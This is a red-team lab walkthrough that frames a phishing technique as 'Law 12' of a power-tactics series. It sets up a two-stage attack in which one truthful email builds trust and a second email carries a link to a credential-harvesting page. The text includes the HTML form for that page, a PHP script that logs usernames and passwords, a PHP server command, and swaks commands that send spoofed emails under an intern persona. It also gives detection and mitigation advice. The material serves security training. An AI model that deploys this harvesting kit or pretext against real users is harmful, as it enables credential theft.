## **Law 12 — Use Selective Honesty and Generosity to Disarm**

Interpretation (offensive context):  
Deliberately reveal **small, verifiable truths or provide harmless value** to lower defenses. Controlled honesty creates **credibility**, which you later convert into compliance.

---

# 🎯 Attack Scenario — _Trust Priming via Benign Disclosure → Credential Harvest_

You start by providing **useful, accurate information** (no payload). Once trust is established, you introduce a credential capture step framed as a continuation.

**Persona:**

> _Amelia Brooks_, 20 y/o IT Intern

---

# 🔴 Red Team Objective

- Accelerate trust formation
    
- Transition from:
    
    - benign interaction → credential capture
        
- Reduce:
    
    - suspicion during attack phase
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Controlled Honesty (Disarm)

Send a **genuinely useful message**:

> “Hi, just a heads-up — the internal file server was slow earlier, but it’s stable now. You might need to refresh your session.”

👉 This contains:

- plausible info
    
- no malicious content
    
- builds credibility
    

---

## Phase 2 — Micro-Help (Generosity Layer)

Follow-up:

> “If it still doesn’t work, you can re-access it here:”

Link:

```id="d4p7sk"
http://192.168.56.101:8080
```

👉 You appear helpful, not intrusive

---

## Phase 3 — Payload (Hidden Behind Help)

Landing page:

```html
<form action="log.php" method="POST">
<input name="user" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<button>Reconnect</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

## Phase 4 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 5 — Delivery Sequence

### Step 1 (Honesty):

```bash
swaks --to target@corp.local \
--from amelia.b@corp.local \
--server 192.168.56.101 \
--data "Subject: Quick update

Hi,

The file server had a minor issue earlier, but it's stable now. You might need to refresh your session."
```

---

### Step 2 (Exploit):

```bash
swaks --to target@corp.local \
--from amelia.b@corp.local \
--server 192.168.56.101 \
--data "Subject: Reconnect link

If it still doesn’t work, you can re-access it here:

http://192.168.56.101:8080"
```

---

## Phase 6 — Execution

Target:

- trusts sender due to prior accuracy
    
- sees consistency in messaging
    
- follows link → submits credentials
    

👉 Trust → Compliance

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Rapport building** via truthful interaction
    
- **Reciprocity principle** → user feels inclined to cooperate
    
- **Pretext reinforcement** → consistent narrative
    

Key principle:

> A small truth can legitimize a large lie

---

# 🛡️ Detection & Defensive Insight

Indicators:

- multi-step interaction:
    
    - benign → action request
        
- “helpful” messages followed by login prompts
    
- subtle behavioral shift
    

Mitigation:

- user awareness:
    
    - “Even helpful messages can be attack setup”
        
- enforce:
    
    - no credential entry via emailed links
        
- monitor:
    
    - multi-stage communication patterns
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Trust Priming and Selective Honesty

### Include:

- two-stage email sequence
    
- explanation of trust-building phase
    
- credential capture evidence
    
- analysis:
    
    - why honesty reduced suspicion
        
- impact:
    
    - high-confidence compromise
        

---

# ⚠️ Operator Insight

Pure deception:

- triggers skepticism
    

Blended truth + deception:

- bypasses defenses
    

You don’t start with the attack  
You **prepare the target to accept it**

---

